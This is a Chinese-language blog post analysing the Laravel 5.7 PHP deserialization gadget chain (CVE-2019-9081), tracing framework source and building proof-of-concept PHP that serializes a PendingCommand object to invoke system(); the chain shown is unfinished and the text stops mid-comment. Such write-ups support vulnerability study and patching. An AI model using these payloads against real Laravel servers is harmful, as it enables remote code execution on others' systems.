<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081） | ArcNova</title><meta name="author" content="ArcNova"><meta name="copyright" content="ArcNova"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）参考自：https:&#x2F;&#x2F;secfeng.github.io&#x2F;2023&#x2F;05&#x2F;30&#x2F;laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F; https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）">
<meta property="og:url" content="https://arcnova7.github.io/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/index.html">
<meta property="og:site_name" content="ArcNova">
<meta property="og:description" content="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）参考自：https:&#x2F;&#x2F;secfeng.github.io&#x2F;2023&#x2F;05&#x2F;30&#x2F;laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F; https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg">
<meta property="article:published_time" content="2026-01-25T04:53:46.036Z">
<meta property="article:modified_time" content="2026-01-25T04:57:34.073Z">
<meta property="article:author" content="ArcNova">
<meta property="article:tag" content="PHP反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）",
  "url": "https://arcnova7.github.io/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/",
  "image": "https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg",
  "datePublished": "2026-01-25T04:53:46.036Z",
  "dateModified": "2026-01-25T04:57:34.073Z",
  "author": [
    {
      "@type": "Person",
      "name": "ArcNova",
      "url": "https://ArcNova7.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://arcnova7.github.io/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ArcNova</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-25T04:53:46.036Z" title="Created 2026-01-25 12:53:46">2026-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-25T04:57:34.073Z" title="Updated 2026-01-25 12:57:34">2026-01-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP-反序列化——Laravel5-7-反序列化链路分析（CVE-2019-9081）"><a href="#PHP-反序列化——Laravel5-7-反序列化链路分析（CVE-2019-9081）" class="headerlink" title="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）"></a>PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</h1><p>参考自：<a target="_blank" rel="noopener" href="https://secfeng.github.io/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://secfeng.github.io/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45678034/article/details/122292624">https://blog.csdn.net/weixin_45678034&#x2F;article&#x2F;details&#x2F;122292624</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Foundation&#x2F;Testing&#x2F;PendingCommand.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;hasExecuted) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $this-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入 run 函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">run</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;hasExecuted = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        <span class="variable">$exitCode</span> = <span class="variable">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="variable">$this</span>-&gt;<span class="built_in">command</span>, <span class="variable">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; catch (NoMatchingExpectationException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$e</span>-&gt;getMethodName() === <span class="string">&#x27;askQuestion&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;fail(<span class="string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="variable">$e</span>-&gt;getActualArguments()[0]-&gt;getQuestion().<span class="string">&#x27;&quot; was asked.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;expectedExitCode !== null) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;assertEquals(</span><br><span class="line">            <span class="variable">$this</span>-&gt;expectedExitCode, <span class="variable">$exitCode</span>,</span><br><span class="line">            <span class="string">&quot;Expected status code &#123;<span class="variable">$this</span>-&gt;expectedExitCode&#125; but received &#123;<span class="variable">$exitCode</span>&#125;.&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$exitCode</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先构造一个序列化值进入 run</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">namespace</span> Illuminate\Foundation\Testing&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> function __construct($command, $parameters)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;command = $command;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;parameters[] = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    use Illuminate\Foundation\Testing\PendingCommand;</span><br><span class="line">    $mm = <span class="keyword">new</span> <span class="built_in">PendingCommand</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">    <span class="function">echo <span class="title">base64_encode</span><span class="params">(serialize($mm))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/LqhMbE6AGoOVs4xkm6VjTK8Pplf.png"></p>
<p>分析一下 mockConsoleOutput()函数，发现在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">function</span> <span class="function"><span class="title">createABufferedOutputMock</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::_mock_(BufferedOutput::class.<span class="string">&#x27;[doWrite]&#x27;</span>)</span><br><span class="line">            -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">            -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">    foreach (<span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;expectedOutput as <span class="variable">$i</span> =&gt; <span class="variable">$output</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;doWrite&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(<span class="variable">$output</span>, Mockery::_any_())</span><br><span class="line">            -&gt;andReturnUsing(<span class="keyword">function</span> () use (<span class="variable">$i</span>) &#123;</span><br><span class="line">                <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;expectedOutput[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行 foreach ($this-&gt;test-&gt;expectedOutput as $i &#x3D;&gt; $output) 时候，因为 test 为 null，所以报错</p>
<p>为 test 赋值，这里直接全局搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __get(</span><br></pre></td></tr></table></figure>

<p>找到 vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;DefaultGenerator.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($attribute)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里返回值可控，让其返回一个数组</p>
<p>写一个 POC</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">namespace</span> Faker&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> $<span class="keyword">default</span>;</span><br><span class="line">        <span class="keyword">public</span> function __construct()&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="keyword">default</span> = <span class="built_in">array</span>(<span class="string">&quot;abc&quot;</span>=&gt;<span class="string">&quot;KFC&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> Illuminate\Foundation\Testing&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\DefaultGenerator;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> function __construct($command, $parameters)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;command = $command;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;parameters[] = $parameters;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;test = <span class="keyword">new</span> <span class="built_in">DefaultGenerator</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    use Illuminate\Foundation\Testing\PendingCommand;</span><br><span class="line">    $mm = <span class="keyword">new</span> <span class="built_in">PendingCommand</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">    <span class="function">echo <span class="title">base64_encode</span><span class="params">(serialize($mm))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下断点继续调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">function</span> <span class="function"><span class="title">mockConsoleOutput</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::_mock_(OutputStyle::class.<span class="string">&#x27;[askQuestion]&#x27;</span>, [</span><br><span class="line">        (new ArrayInput(<span class="variable">$this</span>-&gt;parameters)), <span class="variable">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    foreach (<span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;expectedQuestions as <span class="variable">$i</span> =&gt; <span class="variable">$question</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;askQuestion&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::_on_(<span class="keyword">function</span> (<span class="variable">$argument</span>) use (<span class="variable">$question</span>) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$argument</span>-&gt;getQuestion() == <span class="variable">$question</span>[0];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="keyword">function</span> () use (<span class="variable">$question</span>, <span class="variable">$i</span>) &#123;</span><br><span class="line">                <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;expectedQuestions[<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$question</span>[1];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">bind</span>(OutputStyle::class, <span class="keyword">function</span> () use (<span class="variable">$mock</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$mock</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续执行到$this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {这里，发现 app 属性为空，报错，这里给 $app 属性是实例化的 application 对象，赋值为 new Application();</p>
<p><img src="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/A7kybLHUdobfwYxgWy6jGYDMpof.png"></p>
<p>继续走，函数执行跳出 $this-&gt;mockConsoleOutput();</p>
<p>然后执行到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exitCode</span> = <span class="variable language_">$this</span>-&gt;app[<span class="title class_">Kernel</span>::<span class="variable language_">class</span>]-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$this</span>-&gt;command, <span class="variable">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure>

<p>这个时候的 app 已经是 Application 类的对象,kernel:class 是 Illuminate\Contracts\Console\Kernel,对象被当做数组使用的话必须要使用 ArrayAccess 接口，而刚好 Application 类的父类 Container 类中就有使用了这个接口,这个 call 函数也是在 app 中的,所以得返回一个 app 对象</p>
<p>一直执行，跳转到跳到父类 vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Container&#x2F;Container.php 的 make</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> make(<span class="variable">$abstract</span>, array <span class="variable">$parameters</span> = [])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>-&gt;resolve(<span class="variable">$abstract</span>, <span class="variable">$parameters</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续执行，进入 resolve 函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> function <span class="title function_">resolve</span><span class="params">($<span class="keyword">abstract</span>, $parameters = [])</span></span><br><span class="line">&#123;</span><br><span class="line">    $<span class="keyword">abstract</span> = $<span class="built_in">this</span>-&gt;getAlias($<span class="keyword">abstract</span>);</span><br><span class="line"></span><br><span class="line">    $needsContextualBuild = ! empty($parameters) || ! is_null(</span><br><span class="line">        $<span class="built_in">this</span>-&gt;getContextualConcrete($<span class="keyword">abstract</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If an instance of the type is currently being managed as a singleton we&#x27;ll</span></span><br><span class="line">    <span class="comment">// just return an existing instance instead of instantiating new instances</span></span><br><span class="line">    <span class="comment">// so the developer can keep using the same objects instance every 